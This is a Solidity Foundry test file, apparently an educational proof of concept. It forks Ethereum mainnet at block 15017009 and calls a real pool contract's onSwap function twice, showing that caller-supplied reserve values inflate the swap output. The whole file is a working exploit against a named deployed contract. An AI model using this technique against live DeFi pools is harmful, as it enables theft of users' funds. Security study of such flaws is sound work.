// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

// this excersise is about direct token manipulation

interface ISpace {
    function onSwap(
        SwapRequest memory request,
        uint256 reservesTokenIn,
        uint256 reservesTokenOut
    ) external returns (uint256);

    struct SwapRequest {
        IVault.SwapKind kind;
        IERC20 tokenIn;
        IERC20 tokenOut;
        uint256 amount;
        // Misc data
        bytes32 poolId;
        uint256 lastChangeBlock;
        address from;
        address to;
        bytes userData;
    }
}

interface IVault {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract ContractTest is DSTest {
    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IVault.SwapKind kind = IVault.SwapKind(0);
    ISpace.SwapRequest aad =
        ISpace.SwapRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15017009); //fork mainnet at block 15017009
    }

    function testExploit() public {
        //onswap:reservesTokenIn, reservesTokenOut;
        console.log(
            "Amount Calculated:",
            space.onSwap(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        ); //744039785002747962
        console.log(
            "Manipulated Amount Calculated:",
            space.onSwap(aad, 2000000000000000000, 2000000000000000000)
        ); //1860147027671744844
    }
}
